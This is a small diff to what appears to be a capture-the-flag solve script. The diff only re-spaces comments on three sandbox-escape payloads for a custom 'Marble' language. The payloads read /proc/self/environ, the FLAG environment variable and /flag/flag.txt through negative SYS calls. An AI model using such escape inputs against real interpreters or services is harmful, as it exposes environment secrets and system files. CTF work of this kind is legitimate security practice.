@@ -39,9 +39,9 @@ FLAG_RE = re.compile(rb"NCTF\{[^}]+\}")
 
 # Escape programs, most general first. Each is one Marble line.
 PROGRAMS = [
-    b'"/proc/self/environ" 0 1 SUB SYS PRINT',   # read() via SYS -1 -> environ
-    b'"FLAG" 0 2 SUB SYS PRINT',                 # env("FLAG") via SYS -2
-    b'"/flag/flag.txt" 1 NEG SYS PRINT',         # read() via SYS -1 -> flag file
+    b'"/proc/self/environ" 0 1 SUB SYS PRINT',  # read() via SYS -1 -> environ
+    b'"FLAG" 0 2 SUB SYS PRINT',  # env("FLAG") via SYS -2
+    b'"/flag/flag.txt" 1 NEG SYS PRINT',  # read() via SYS -1 -> flag file
 ]
 
 
